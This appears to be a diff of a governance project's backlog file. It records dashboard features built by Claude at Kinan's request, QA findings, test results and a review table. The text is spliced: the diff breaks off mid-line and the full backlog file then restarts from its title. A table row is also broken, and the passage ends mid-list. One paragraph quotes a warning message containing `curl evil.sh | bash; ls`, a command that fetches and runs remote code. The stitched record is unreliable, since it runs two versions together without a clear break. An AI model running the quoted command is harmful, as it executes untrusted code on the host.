@@ -32,8 +32,8 @@ was decided on 2026-09-09 (sweep register C5) and its row here had not been stru
 escalation from the Policy section. The task as Kinan wrote it, and what was built, are
 §"A12" below.
 
-**A13, added 2026-09-18, is open** and is the one item Claude can build: rename and re-own an agent
-from the dashboard, whose routes exist and which nothing on the page calls. §"A13" below has the task.
+**A13, added 2026-09-18, was built on 2026-09-19** at Kinan's word, with **C15** (§"C15 and A13
+built"): rename and re-own an agent from the dashboard, whose routes existed and which nothing on the page called. §"A13" below has the task.
 The same day's live QA found and fixed findings 375 and 376 (§"The QA over 2026-09-11 to 15, driven
 live"). **On 2026-09-19 the dashboard was driven live again with a model connected**, which found
 and fixed **377–379** and opened decision **C15** (§"The live QA of 2026-09-19, with a model
@@ -733,7 +733,818 @@ the same with the committed `approval.ts` swapped in. Mutations: 377's condition
 its test red. Live: 377 (no report after a timeout), 378 (the new sentence) and 379 (refused at filing,
 the list without `main`) on the rebuilt Gateway. Full lint gate exit 0 with the raised cap.
 
-### A13: rename and re-own an agent from the dashboard (added 2026-09-18, open)
+### C15 and A13 built (2026-09-19, at Kinan's word)
+
+**Asked by Kinan:** "go with your recommendation on C15 and build A13, then test them."
+
+**C15, built as recommended.** A rule request filed by answering an escalation now carries
+`answeredBy`, the governance account that answered, and names it in the queue (_"lina, answering an
+escalation"_), in its ledger entry's actor and in the decision's sentence. `requestedBy` keeps
+`hitl-approval`, so the queue budget (40 + 20 per account) and de-duplication are unchanged and a
+User's presses do not count against that User's own 20. _Would allow_ passes its session; _Always
+allow_ is filed in the agent's approval callback, whose type is public plugin API, so the approvals
+route notes the answerer under the approval's id before resolving it and the host runs the callback
+inside that id (`src/governance/approval-answerers.ts`, `AsyncLocalStorage`; the note is taken once,
+forgotten if the answer fails, bounded at 256 and 25 hours). Chat-run approvals keep the anonymous
+label. Files: `approval-answerers.ts`, `rule-requests.ts`, `policy-engine.ts`,
+`governance-dashboard-approvals.ts`, `governance-dashboard-oversight.ts`,
+`agent-tools.before-tool-call.approval.ts`, and on the page `account-panels.ts`,
+`api.rule-requests.ts`, `en-governance.ts`.
+
+**A13, built as the task below describes.** **Edit…** on a registered row for whoever
+`administersAgent` admits; a display-name field (the id stated as fixed); for Root, a picker of
+`agentOwners` and **Change owner**, confirmed first with who loses the agent; an owning
+Administrator is told to ask Root. `panels/agent-edit-controls.ts`, three draft fields in
+`agent-registry-panels.ts`, strings in `en-governance.ts`.
+
+**Tests, red first:** `escalation-request-author.test.ts` (new), additions to
+`governance-approvals.test.ts`, `governance-reregistered-agent-questions.test.ts`,
+`agent-tools.before-tool-call.e2e.test.ts` and `agent-setting-request.test.ts`, and
+`agent-edit-controls.test.ts` (new, nine tests). **Mutations: ten, all caught** by the test meant to
+catch each, every file restored with its hash checked.
+
+**Verified (2026-09-19/20).** Four typechecks 0 (the test typechecks first failed on
+`agent-delete-choice.test.ts`'s hand-built drafts, which lacked the three new fields; fixed). Governance
+suite 3,206 passed, 21 skipped, **0 failed**, in 196 files. Whole `ui/src` suite 8,241 passed, 5 failed
+(A10's five, by their error). Browser project 199 in 22 files. `agent-tools.before-tool-call.e2e.test.ts`
+96 passed and the same six Windows failures as at HEAD, by title. Full lint gate exit 0 with the raised cap.
+**Live, on the rebuilt QA Gateway:** usr1 pressed _Always allow_ on a dashboard card and the request
+for `^getmac# Remaining work
+
+The long-form backlog of the governance layer: every task, what it was, why it
+mattered, and how it closed. **§"Where this file stands" is the current state,
+re-derived from the rows and the code on 2026-09-14.** Everything carrying an earlier
+date further down is history, kept because it is Chapter 4's raw material.
+
+Items come from the QA rounds and sweeps (`GOVERNANCE.md`,
+`docs-notes/QA-IN-PLAIN-TERMS.md`), from the independent review against the PDF
+specification (`Kimi_QA_1.md`, removed 2026-09-13 once every item was checked; see
+§"The independent review, checked item by item"), and from Kinan's requests. Nothing
+here is speculative.
+
+### Where this file stands (re-derived 2026-09-14)
+
+**Companion documents.** `mg/HANDOFF.md` first, if you are picking this up cold;
+`mg/PROJECT-SUMMARY.md` for what the project is; and
+`mg/REMAINING-WORK-DASHBOARD-SWEEP.md` for the short answer to "what is left and whose
+is it", sorted by who has to move first. **Where these disagree about a count, count the
+rows of `mg/HANDOFF.md` §6**, which is the authority, and correct the stale one.
+
+**Open, counted from the rows of §"The numbered backlog" on 2026-09-15: nine unstruck, one
+of which is T1 (not being done), so eight.** T3 (the Linux host), T13 (a read), T17 (the
+figures), T18 (the report), T46 (the setup wizard's wording), T47 (the by-hand plan), and
+T58 and T59 (whether `edit` is ours, and per-agent models). The same nine as
+`mg/HANDOFF.md` §6. **T48 and T49 closed on 2026-09-15**: Kinan answered T48 yes, so
+Chapter 3 is written now, and chose option (b) for T49, one organisation per installation
+is the boundary (`docs-notes/CHAPTER3-MATERIAL.md` §3.5.89). **T50 was a twelfth until this re-derivation**: it
+was decided on 2026-09-09 (sweep register C5) and its row here had not been struck.
+
+**A12, Claude's alone, is built** (2026-09-14, later): an Administrator sets one agent's
+escalation from the Policy section. The task as Kinan wrote it, and what was built, are
+§"A12" below.
+
+**A13, added 2026-09-18, was built on 2026-09-19** at Kinan's word, with **C15** (§"C15 and A13
+built"): rename and re-own an agent from the dashboard, whose routes existed and which nothing on the page called. §"A13" below has the task.
+The same day's live QA found and fixed findings 375 and 376 (§"The QA over 2026-09-11 to 15, driven
+live"). **On 2026-09-19 the dashboard was driven live again with a model connected**, which found
+and fixed **377–379** and opened decision **C15** (§"The live QA of 2026-09-19, with a model
+connected"); the same day every figure in `docs-notes/FIGURES.md` was re-audited (T17's
+material, fifteen corrected).
+
+**Numbered elsewhere:** T67 is finding 169, unexplained and never reproduced, kept in
+the sweep register; T65 and T66 were second numbers for T63 and T60 and are withdrawn
+(finding 343). **Findings are counted in `GOVERNANCE.md`'s register, not here**, and
+anything the 2026-09-14 QA adds is recorded in §"Documents 7–9 and the QA over the
+last week" below.
+
+**Two traps when counting.** T13 has two rows, struck where its drafting was recorded
+and open where the reading still is (finding 259). And §"Who can do what" and the
+lettered groups beneath the table repeat rows as they stood on their own dates, so
+count the main table only.
+
+**A second backlog, §"The M-series" (M1–M6)**, holds the multi-tenancy feature,
+complete since 2026-08-27. §"What is actually left" is kept unedited as of 2026-08-19.
+
+### A12: let an Administrator set one agent's escalation (added and built 2026-09-14)
+
+**Claude's alone; recorded in the sweep register's A table as A12.** The task, as Kinan
+wrote it:
+
+> **Repo:** `C:\Users\kinan\openclaw`, branch `governance-layer` (a governance fork of
+> OpenClaw; read `mg/HANDOFF.md` §1 first, then `docs-notes/PERMISSION-SPEC.md` §8).
+>
+> **Gap found 2026-09-13 while building sweep task A11:** the governance dashboard has no
+> control that **sets** a per-agent escalation override (`ask`: `off` = deny an unlisted
+> action, `on-miss` = ask a human). The route exists and is Administrator-floor:
+> `POST /control-ui/governance/policy/agent-ask` with
+> `{ agentId, ask: "off" | "on-miss" | null }` in `src/gateway/governance-dashboard-api.ts`
+> (~line 615), and the client method `setAgentAsk` exists in
+> `ui/src/pages/governance/api.ts`. But the only UI call is `setAgentAsk(agentId, null)`
+> ("Use default") on an existing override row in
+> `ui/src/pages/governance/panels/policy-panels.ts` (~line 540). Per-agent posture has an
+> "Observe one agent" row (Monitor/Enforce buttons) for Administrators; escalation has no
+> equivalent. So an Administrator can only create a per-agent escalation override by
+> recording a User-style agent-setting request under Rule requests ("Request a change for
+> one agent") and approving it, or by hand-written HTTP.
+>
+> **Do:** add an Administrator/Root control (hidden below Administrator, as
+> `canEditPostures` gates the posture row) to set one agent's escalation to "Ask a human"
+> or "Deny", mirroring the "Observe one agent" row, ideally with an agent picker limited
+> to known agents. `policy-panels.ts` is at the 700-line lint limit
+> (skipBlankLines/skipComments), so put the row in its own module (see
+> `panels/policy-agent-timeout.ts` for the pattern) rather than suppressing the rule. Then
+> update the Administrator hint `governance.requests.settingRequestHintRecord` in
+> `ui/src/i18n/locales/en-governance.ts`, which currently says only a posture can be set
+> directly.
+>
+> **Conventions:** tests through the rendered panel (see
+> `ui/src/pages/governance/agent-setting-request.test.ts` for a harness), mutation-check
+> each new test (revert the protection, see the named test title fail, restore). Verify
+> with `node node_modules/vitest/vitest.mjs run --config test/vitest/vitest.ui.config.ts <files>`,
+> `node scripts/run-tsgo.mjs -p tsconfig.ui.json`, and
+> `node node_modules/oxlint/bin/oxlint --config .oxlintrc.json <files>`, reading every exit
+> code. Record it in `GOVERNANCE.md`, `docs-notes/CHAPTER3-MATERIAL.md` and
+> `docs-notes/QA-IN-PLAIN-TERMS.md`, and update `docs-notes/WRITING-PERMISSIONS.md` §4d and
+> `mg/REMAINING-WORK.md`. Never commit `.codex/`. Do not commit or push unless asked.
+
+**Two notes from the code as it stands on 2026-09-14**, for whoever takes it. The
+Policy section already renders `renderAgentTimeoutRow(props)` right after the posture
+rows, which is where a sibling row belongs; and T47 row 2.5's "known gap" note and
+`docs-notes/WRITING-GUIDE.md` §4's claims table both name this gap and should change
+with it.
+
+**Built 2026-09-14, later.** The Policy section has **Escalation for one agent**: a picker
+of the agents the account manages (`manageableAgentIds`, as the A11 form uses) and **Ask a
+human** / **Deny**, calling `setAgentAsk(agentId, "on-miss" | "off")`; the override row
+that then appears keeps **Use default**. It lives in
+`ui/src/pages/governance/panels/policy-agent-overrides.ts` with **Observe one agent**,
+moved there whole, and both rows take the section's `canEditPostures`, so the two
+per-agent controls have one gate (finding 369 is the reason). A User keeps the pointer to
+the request form. The page carries the choice as `askAgentId` and clears it on sign-out,
+and Rule requests' Administrator hint now says a posture **or an escalation** can be set
+directly.
+
+- **Decisions.** A picker, not a typed id (finding 327's shape, and the A11 form's
+  precedent); a draft naming an agent no longer offered counts as no choice; no
+  confirmation, since **Observe one agent**, the wider change, asks none.
+- **Noticed, not changed.** `canEditPostures` includes `!props.busy`, so both per-agent
+  rows disappear while any action is in flight. It was already so for **Observe one
+  agent**, and the rows keep one gate rather than two.
+- **Tests.** `ui/src/pages/governance/agent-ask-setter.test.ts`, 7: five through the
+  rendered row with a stub client, two through the mounted page. The hint expectation in
+  `agent-setting-request.test.ts` changed with the text. **7 mutations, 7 caught**, each
+  file restored and hash-checked: the gate ignored, the values swapped, the buttons live
+  with no agent, a stale draft acted on, the page dropping the draft, the section not
+  drawing the row, and the row drawn for a User.
+- **Docs.** `GOVERNANCE.md`'s per-agent paragraph under the role table,
+  `docs-notes/WRITING-PERMISSIONS.md` §4d, T47 rows 2.5.5–2.5.6 (replacing the gap note),
+  `docs-notes/WRITING-GUIDE.md` §3 and §4, design §3.5.88, plain language §5.115, and the
+  sweep register's A12 row.
+- **Verified on the final tree:** governance suite 3,123 passed, 21 skipped, 0 failed, in
+  187 files (the seven over the QA tree's 3,116 are A12's); whole `ui/src` suite 8,211
+  passed with A10's five jsdom failures, each confirmed by its error; ui-isolated 403
+  passed, 1 skipped; browser project 199 passed in 22 files; host suites 263; the four
+  typechecks 0; plain `oxlint` and `oxfmt --check` over the changed files 0; **the full
+  lint gate 0**, with the raised cap, in about twenty minutes.
+- **Not established:** a live run on a real screen (T47 rows 2.5.5 and 2.5.6 are the
+  by-hand check), and `build-all`.
+
+### The independent review, checked item by item (2026-09-13)
+
+**Every point `Kimi_QA_1.md` raised was checked against the code as it stands, and the file
+was then removed; it is in git history.** One item was still open and was fixed in the same
+pass: the kill switch's _Lock down_ button acted on one click, while _Stop_ in Active agent
+sessions, which locks the same agent the same way, asked first. It now asks too
+(`ui/src/pages/governance/kill-switch-confirm.test.ts`). Two more followed the same day, at
+Kinan's direction: bug 8 is fixed, and unanchored patterns and clashes are now shown in
+the rule-request queue before approval, where they had been invisible. A third came out of
+rewriting the permissions guide against the code: a path rule ending at a folder boundary,
+`^src(/|$)`, which is the shape the folder-grant form writes, was warned as unanchored with
+a message about `curl evil.sh | bash; ls`. A path's `(/|$)` now counts as its end anchor
+(`src/governance/rule-warnings.test.ts`, 3 mutations caught). And one gap was found, sweep
+task **A11**: a User could ask for a per-agent posture or escalation change only through
+the API, because no dashboard form filed that request. **A11 was built later the same
+day** (§"A11" below), and building it found **finding 365**: approving a request for an
+`off` posture answered yes, recorded the change in the ledger, and changed nothing.
+
+| Review item                                            | Where it stands                                                                                                                                                                                                                                                                                                                                               | On the dashboard                                                                            |
+| ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
+| Native harness skips the gate                          | Fixed (B1): governance requires the native tool relay (`native-relay-requirement.ts`)                                                                                                                                                                                                                                                                         | Not a dashboard matter                                                                      |
+| Administrative actions not in the ledger               | Fixed: `recordAdminAction` at every administrative write (44 call sites outside tests, counted 2026-09-14)                                                                                                                                                                                                                                                    | _Audit ledger_, with an administrative filter and Verify                                    |
+| Kill switch measured dispatch, not the stop            | Fixed (A3), and extended to dashboard prompts by finding 364                                                                                                                                                                                                                                                                                                  | _Emergency kill switch_ reports "signalled in" and whether the stop was confirmed           |
+| A locked agent with no agent id in context             | Fixed: the id falls back to the session key, and the lineage is checked                                                                                                                                                                                                                                                                                       | Not a dashboard matter                                                                      |
+| Rule authoring races another writer                    | Fixed: conflicts are detected inside the policy lock                                                                                                                                                                                                                                                                                                          | Conflict notice beside _Policy_                                                             |
+| Pending decisions grow without bound                   | Fixed (T56): 200 undecided, 500 stored, and the shed count reported                                                                                                                                                                                                                                                                                           | _Awaiting your decision_ says how many were dropped                                         |
+| Catch-all detector misses `^` and `.+`                 | Fixed                                                                                                                                                                                                                                                                                                                                                         | Warned on authoring                                                                         |
+| No warning when a time-limited rule is made indefinite | **Fixed 2026-09-13, at Kinan's decision.** A new clash kind, `extends-time-limited`, under its own heading, and the ledger entry for the new rule names the temporary rule it extends                                                                                                                                                                         | Notice on the Policy form, on a folder grant, and in the rule-request queue before approval |
+| A User may set the per-agent escalation                | Fixed: `policy/agent-ask` requires Administrator. A User requests the change instead, from _Rule requests_, **Request a change for one agent** (A11, built 2026-09-13; until then the request could be filed only through the API). Building it found finding 365: an approved request for an `off` posture was recorded and never applied; it is now refused | _Policy_, Administrator and Root                                                            |
+| "Allow always" becomes global with no agent id         | Fixed: it files an agent-scoped rule request, and is refused with no agent                                                                                                                                                                                                                                                                                    | _Rule requests_                                                                             |
+| A lock can time out before a stale lock is reaped      | Fixed: stale after 15 s against a 30 s wait, with a heartbeat                                                                                                                                                                                                                                                                                                 | Not a dashboard matter                                                                      |
+| No confirmation for destructive controls               | Fixed: removing a rule, deleting an account, changing a role, setting a password, stopping or unregistering an agent, and now the kill switch                                                                                                                                                                                                                 | Every one asks first                                                                        |
+| Data never refreshed; stale after sign-out             | Fixed: a 15-second refresh, and an expired session clears to sign-in                                                                                                                                                                                                                                                                                          | The whole page                                                                              |
+| Sign-in does not submit on Enter                       | Fixed                                                                                                                                                                                                                                                                                                                                                         | Sign-in form                                                                                |
+| Password hashes do not record scrypt's cost            | Fixed: `N`, `r` and `p` are stored with each hash                                                                                                                                                                                                                                                                                                             | Not a dashboard matter                                                                      |
+| Patterns recompiled on every call                      | Fixed: a bounded compiled-pattern cache                                                                                                                                                                                                                                                                                                                       | Not a dashboard matter                                                                      |
+| Paths not canonicalised or symlink-hardened            | Fixed (T23): `..` collapsed and symlinks resolved with `realpath`                                                                                                                                                                                                                                                                                             | Not a dashboard matter                                                                      |
+| Unanchored patterns accepted silently                  | Warned, deliberately not refused (`describeRuleRisks`). **The gap was approval, closed 2026-09-13**: a User's rule request was approved with no warning, because approval creates the rule and returned none. A pending request now shows its warnings and clashes before anyone approves. A path rule ending at a folder boundary, `^src(/                   | $)`, counts as anchored (2026-09-13)                                                        | Warning on authoring, and in the request queue before approval |
+| Rule lifetime (requirement 4)                          | Built                                                                                                                                                                                                                                                                                                                                                         | _Policy_: "Rule lifetime in minutes"                                                        |
+| Default posture `monitor`, not default-deny            | Decided by the supervisor: `enforce` with shipped baseline rules; `monitor` is opt-in per agent                                                                                                                                                                                                                                                               | _Policy_ posture, installation-wide and per agent                                           |
+| No per-user escalation toggle for Root                 | Built (`userAsk`)                                                                                                                                                                                                                                                                                                                                             | _Policy_, Root's settings                                                                   |
+| No deployment oversight for Root                       | Built                                                                                                                                                                                                                                                                                                                                                         | _Deployment and network posture_                                                            |
+| Users cannot talk to their agents                      | Built (A1)                                                                                                                                                                                                                                                                                                                                                    | _Your agents_, with the conversation                                                        |
+| The CLI bypasses the tiers                             | Removed with the CLI (2026-09-07)                                                                                                                                                                                                                                                                                                                             | Every administrative action is on the dashboard                                             |
+| Loop-detector blocks not logged                        | Fixed: `recordLoopDetectorBlock`                                                                                                                                                                                                                                                                                                                              | _Audit ledger_                                                                              |
+| Ledger has no external anchor                          | Fixed: keyed entries and a checkpoint, verified from outside by `scripts/verify-ledger.mjs`                                                                                                                                                                                                                                                                   | _Audit ledger_ Verify                                                                       |
+| Node 18 or higher                                      | Complies: the project requires 22 or later, which is higher; one sentence for the report                                                                                                                                                                                                                                                                      | Not a dashboard matter                                                                      |
+
+### A11: a User's agent-setting request, from the dashboard (2026-09-13, built)
+
+**Done.** A User files a per-agent posture or escalation request from _Rule requests_; a
+path request can ask for one direction; finding 365 is fixed. Verified: 9 route tests and
+12 UI tests, 18 mutations all caught (the first run's one survivor was a test that could
+not fail, and was rewritten); typechecks core, UI and both test configs 0; plain `oxlint`
+and `oxfmt --check` 0. Not driven live; the full governance suite, the type-aware lint gate
+and `build-all` were not run. Full record: `mg/REMAINING-WORK-DASHBOARD-SWEEP.md`
+§"A11 built". Registers: `GOVERNANCE.md` row 365, `docs-notes/CHAPTER3-MATERIAL.md`
+§3.5.84, `docs-notes/QA-IN-PLAIN-TERMS.md` §5.111.
+
+**Progress log, as the work went.**
+
+- **Started.** The uncommitted tree was snapshotted first (tracked diff, staged diff and
+  untracked files, `.codex/` excluded) into the session scratchpad.
+- **Finding 365, proved before anything changed.** A temporary probe drove the real routes:
+  a User submitted `{ setting: "mode", value: "off" }` for their own agent (200, pending),
+  an Administrator approved it (200, `approved`), and then `policy.json` held
+  `agentMode: { mine: "off" }` and the ledger held `governance.policy.agent-mode`,
+  _"posture default -> off"_, while `loadPolicy` returned `agentMode: {}`, because the
+  loader keeps only `enforce` and `monitor`. So the request did not fail at approval, as
+  A11's row assumed: it succeeded on paper and changed nothing. It fails safe, but the
+  tamper-evident trail records a posture change that never took effect. The probe was
+  removed.
+- **Server built.** `POST rule-requests` refuses a `mode` of `off` at submission
+  (`isApplicableSettingValue`); `rule-requests/decide` refuses to approve a stored
+  request it could not apply **before** claiming the decision, so no "approved" entry
+  is written; `setAgentMode` refuses `off` whichever route calls it
+  (`PER_AGENT_OFF_REFUSED`); and a rule request now takes `access`, validated as
+  `policy/rules` validates it (read or write, path only). Route tests
+  `src/gateway/governance-agent-setting-request.test.ts`: 9 passed. Core typecheck 0.
+- **Dashboard built.** _Rule requests_ gains **Request a change for one agent**
+  (`ui/src/pages/governance/panels/agent-setting-request.ts`: the agents the account
+  manages, posture or escalation, a value with no `off` posture, a reason); **Request a
+  rule** gains **Read or write** for a path; a path request's queue row names its
+  direction; and _Policy_ tells a User where to ask. UI tests
+  `ui/src/pages/governance/agent-setting-request.test.ts` with its two neighbours: 59
+  passed in 3 files.
+- **Docs so far:** `docs-notes/WRITING-PERMISSIONS.md` §4d and `docs-notes/PERMISSION-SPEC.md`
+  §8 and §9a.
+
+### Documents 7–9 and the QA over the last week (2026-09-14, done)
+
+**Kinan asked for the next three documents in the update order, then a QA over
+everything worked on in the last week**, recording anything new here as it comes up.
+
+**Candidates found while rewriting `docs-notes/T47-TEST-PLAN.md` against the code**, each
+to be proved before it is numbered:
+
+- **Finding 367, proved by its regression tests before the fix: no dashboard control
+  switches a core rule back on.** Written first and watched failing: after Root switched
+  a core rule off, the policy read carried nothing but its id
+  (`switchedOffCoreRules` undefined), and the Policy section rendered no row for it and no
+  _Switch on_ (`governance-core-rule-switch-on.test.ts`, route and panel). The only call to
+  `setCoreRule` passes `false`; the loader drops a switched-off core rule from the list
+  (`reassertCoreRules`), and nothing renders `disabledCoreRules`. The deployment report's
+  remedy for `deployment.core_rules_intact` says _"Switch it back on in the Policy section
+  of the governance dashboard"_, a control that does not exist. Since the command line was
+  removed on 2026-09-07, a core denial switched off from the dashboard can be restored only
+  by hand-written HTTP. T47 row 1.4.7 fails on it.
+- **Finding 366, proved: approving a request for an agent deleted in the meantime writes
+  back what the deletion cleared.** A temporary probe drove the real routes and the real
+  `deprovisionAgent`: a User filed a posture request (`monitor`) and a path rule request
+  (`^/srv/payroll/.*$`) for agent `doomed`; the agent was deleted from the host, which
+  cleared everything the id carried (0 rules, no posture); both requests stayed pending,
+  still listed under `doomed`; an Administrator approved both, **200 and 200**; and the
+  policy then held **1 rule and a posture override** for an id no longer registered. The
+  ledger records the deletion, then _"posture default -> monitor"_ and _"allow path
+  ^/srv/payroll/.\*$ (agent doomed, indefinite)"_. A new agent registered as `doomed`
+  inherits both, which is the exact case T55 (findings 258, 324) decided deletion must
+  prevent. Nothing on the queue row said the agent was gone. The probe was removed.
+- **The lockout does not say how long.** Five failed sign-ins answer _"Too many failed
+  login attempts. Try again later."_ The server knows the wait and sends it only as a
+  `Retry-After` header, which the page does not read. T47 row 1.1.3 expected the wait
+  stated; the row now records what happens.
+
+**T47 rows corrected against the code** (numbering kept, because the shared sheet cites
+it): 1.2.2 (no Root option is offered at all), 1.2.11–1.2.12 (they described the removed
+command line), 1.6.2 (eight paragraphs, not nine), 2.5.2 (a User now sees a pointer to
+the request form), 2.6.2 and 3.3.1 (Lock down asks first), 2.7.11 (the queue budget is 40
+plus 20 per account, not twenty), 3.2.4 (two prompts per account), 3.5.3 (the cap is 20,
+not six), 4.6 (a Viewer has no request form), 5.4 (deleting an Administrator with accounts
+answering to them is refused), 6c.2 (the card lapses with the escalation timeout, not
+after two minutes), and §6's note (the command line no longer exists). §6d is new: ten
+rows for the work after the push, and two more for findings 366 and 367 (198 rows in all).
+
+**Fixed the same day, each regression test written first and watched failing:**
+
+- **366.** `POST rule-requests/decide` refuses an approval with 409
+  `agent_not_registered` when the request's agent is not registered to the organisation,
+  **before** the decision is claimed, so nothing is written; rejection still works. `GET
+rule-requests` marks such a pending request `agentRegistered: false`, and its queue row
+  says the agent is gone and disables Approve. Tests:
+  `src/gateway/governance-request-deleted-agent.test.ts` (4) and
+  `ui/src/pages/governance/request-deleted-agent-row.test.ts` (3).
+- **367.** `GET policy` carries `switchedOffCoreRules`, the switched-off core rules whole,
+  built from the declarations (`switchedOffCoreRules` in `policy-store.ts`). The Policy
+  section names each one to every tier, with **Switch on** for Root
+  (`policy-root-settings.ts`). Tests: `src/gateway/governance-core-rule-switch-on.test.ts`
+  (2) and `ui/src/pages/governance/core-rule-switch-on.test.ts` (2).
+- **368, low.** The lockout refusal now says _"Try again in 15 minutes."_ Test:
+  `src/gateway/governance-login-lockout-message.test.ts` (1).
+- **The documents that said otherwise, corrected:** T47 rows 1.1.3, 1.4.5 and 1.4.7;
+  `docs-notes/BASELINE-RULES.md` §3, which said a switched-off rule "stays visible on the
+  page" and was rewritten against the code the day before without catching it;
+  `docs-notes/PERMISSION-SPEC.md` §9a rule 4; `docs-notes/WRITING-PERMISSIONS.md` §4d.
+  Registers: `GOVERNANCE.md` rows 366–368, `docs-notes/CHAPTER3-MATERIAL.md` §3.5.85,
+  `docs-notes/QA-IN-PLAIN-TERMS.md` §5.112.
+
+**Checked and found right**, so nobody re-derives them: a pending request's approval
+preview cannot show a User another agent's rule (`scopeCovers` matches only global rules
+and the request's own agent); an agent put in `monitor` by an approved request is still
+stopped by the kill switch (lockdown is checked before the posture in `policy-engine.ts`);
+and a Viewer's ledger stays sanitised (`projectLedgerForActor`).
+
+**Verified, each exit code read:**
+
+- **Mutations: 9 of 9 caught** (366: 4, 367: 4, 368: 1), each protection reverted,
+  the named test seen failing, the file restored and hash-checked.
+- **Governance suite: 3,099 passed, 21 skipped, 0 failed** across 179 files (3,073 before
+  the fixes).
+- **Whole `ui/src` suite: 8,202 passed, 5 failed**, the five jsdom `Blob.stream()`
+  failures A10 recorded, in files the fork never changed, confirmed by their error.
+- **Typechecks** core, UI, core test and UI test: all 0. **Full lint gate**
+  (`OPENCLAW_OXLINT_SHARD_TIMEOUT_MS=2700000 node scripts/run-lint.mjs`): 0, before the
+  fixes; plain `oxlint` over `src` and `ui/src`: 0; plain `oxlint` and `oxfmt --check`
+  over the 14 changed files after them: 0, once one `no-map-spread` error was fixed.
+- **Host suites** 263 passed; **browser project** 199 passed; **ui-isolated** 403
+  passed, 1 skipped.
+- **Doc audit:** its finding counts agree, after `mg/HANDOFF.md`'s state cells were brought
+  level for handoff the same day.
+
+**Not run or not established:** `build-all` (its last step times out on this machine,
+§4); a live run on a real screen of 366–368 or of anything else this week built (T47
+rows 6c.10–6c.13 and 6d are the by-hand checks). **Still open from this pass: nothing.**
+The gap noticed while building A11, that no dashboard control sets a per-agent escalation
+value, is recorded as **A12** (§"A12" above, and the sweep register's A table).
+
+### The QA over three days (2026-09-14, later)
+
+**Kinan asked, after the uncommitted work was committed and documents 10–12 rewritten,
+for a QA over all work of the last three days**: the fifteen commits from `778b769bef2`
+(T60 and T63) to `8f9408c0df0`, and documents 10–12. It began, as §4 advises, with the
+verification set rather than the reading: **the governance suite re-run on the committed
+tree, 3,099 passed, 21 skipped, 0 failed across 179 files**, identical to the uncommitted
+tree's figure. Two axes then carried it: **the documents' claims read against the code**
+(rewriting `GOVERNANCE.md` produced two candidates), and **composition of finding 366
+with every other store keyed by an agent id**.
+
+**Finding 369, proved by a rendered test before the fix: a User is offered a control that
+can only be refused.** `active-sessions-panel.ts` drew **Observe** on a live session for
+any account holding `canStop`, which a User holds for their own agents
+(`canManageAnyAgent`), while `policy/agent-mode` has been Administrator-level since T4.
+The test rendered the section as a User and read `['Observe', 'Stop agent']`. Fixed by
+gating on `canAdminister`, as the Policy section's twin already was; the stale row comment
+("a User sees this") corrected. Test: `ui/src/pages/governance/session-posture-toggle.test.ts`.
+
+**Finding 370, proved by three tests through the real `deprovisionAgent` and the real
+routes: a question about a deleted agent could be answered yes for a new agent under the
+same name.**
+
+- **Rule requests.** 366's approval refusal checked only that the id was registered, so
+  once a new agent was registered under it the old request was approvable (`200`).
+- **Dashboard escalations (T68).** `approvals/decide` checked the agent's group, so an
+  escalation raised for the deleted agent became answerable again once the name was
+  reused, and "Allow once" answered `200`. `deprovisionAgent` does not end the agent's
+  prompt runs, so the run and its card survive until the prompt times out.
+- **Held decisions.** Deletion left the row pending, the list filters only by
+  `canViewAgent`, and `pending-decisions/decide` checked neither registration nor time:
+  "allow" answered `200` and filed a rule proposal, `^/srv/payroll/salaries\.csv$`, for
+  the new agent, unmarked in the queue.
+
+Fixed with one predicate, `registrationPredates` in `agent-registry.ts`: the registration
+under the id must be older than the question (a request's `requestedAt`, an escalation's
+`createdAtMs`, a held decision's `timedOutAt` less `waitedMs`). Registration time is
+written only by `registerAgent`, so renames and re-owning do not disturb it; an unreadable
+time answers "predates". A stale request is marked `agentRegistered: false` and refused
+at approval with 409; a stale escalation is not listed and answers 404, as one whose agent
+is gone; a stale held decision refuses "allow" with 409 and still takes "deny". The
+held-decision answer route moved beside its read in `governance-dashboard-oversight.ts`,
+because the check took `governance-dashboard-api.ts` past its 700-line limit. Tests:
+`src/gateway/governance-approval-reregistered-agent.test.ts` and
+`src/gateway/governance-reregistered-agent-questions.test.ts`, each with a control that
+the check does not refuse a question asked about the agent registered now.
+
+**Finding 371 (open, low): accounts from before organisations cannot be removed.**
+`authenticate` refuses an account with no group, and its comment named `governance groups
+migrate`, removed on 2026-09-07; `deleteUnmigratedAccounts` has no caller, while
+`GOVERNANCE.md` §3 and `CHAPTER3-MATERIAL.md` said the Accounts panel removes them. The
+documents and the comment are corrected. No installation in use can hold such an account.
+Left open as decision **C14** in the sweep register. _(Accepted by Kinan on 2026-09-15, option (b): closed.)_
+
+**A candidate recorded as a decision, not a finding: what "delete from host" leaves
+behind.** `deprovisionAgent` calls only `deleteAgentConfigEntry`; OpenClaw's own
+`agents.delete` also keeps a deletion journal and removes the agent's scheduled jobs, host
+exec-approval policy and session store entries, and by default its files. Whether a new
+agent provisioned under the same id inherits any of that is not proven, because the
+provisioning tests mock both host functions. Recorded as **C13**, recommending that the
+inheritance be proved before anything is deleted. The governance conversation store is not
+cleared on deletion either; it returns to its own author if the name is reused, and is
+recorded rather than changed.
+
+**Proved on 2026-09-15, when Kinan chose C13's option (b): finding 372 (medium, open).** A
+probe on a real OpenClaw state directory
+(`docs-notes/qa-sweep-2026-09-15/c13-deletion-leftovers.probe.test.ts.txt`) provisioned
+`scout`, gave it a workspace file, session and agent-folder markers, a scheduled job and
+an exec-approval allowlist, deleted it through `deprovisionAgent`, and had a different
+Administrator provision `scout` again. Every leftover survived and the new agent received
+all of them. Option (a) would not remove the deleted agent's ledger entries; it is the
+option closest to T55. Both answers, with the evidence, are
+`docs-notes/CHAPTER3-MATERIAL.md` §3.5.90.
+
+### C13 decided: two ways to delete an agent (2026-09-15, BUILT, COMMITTED AND PUSHED)
+
+**Paused mid-build at Kinan's request, then resumed and finished the same day** (§"Resumed and
+finished" below). The implementation landed in `4107a3605fe` and `48e9e56a3a5`; the
+updated record landed in `298bf89b7fa`. `.codex/` is another agent's and is never part of a commit.
+
+**The decision (Kinan, 2026-09-15).** Deleting an agent opens a popup with two options,
+each explained on screen (what it does, when to choose it, the catch, and what happens to
+the audit ledger): **Delete from OpenClaw's agent list only**, which is today's delete, and
+**Delete the way OpenClaw does**, which is OpenClaw's own `agents.delete`. Kinan asked Claude
+to answer the eight follow-up questions with its own recommendations:
+
+1. **Where.** _Remove…_ still offers _Remove from governance_; _Delete the agent…_ opens the
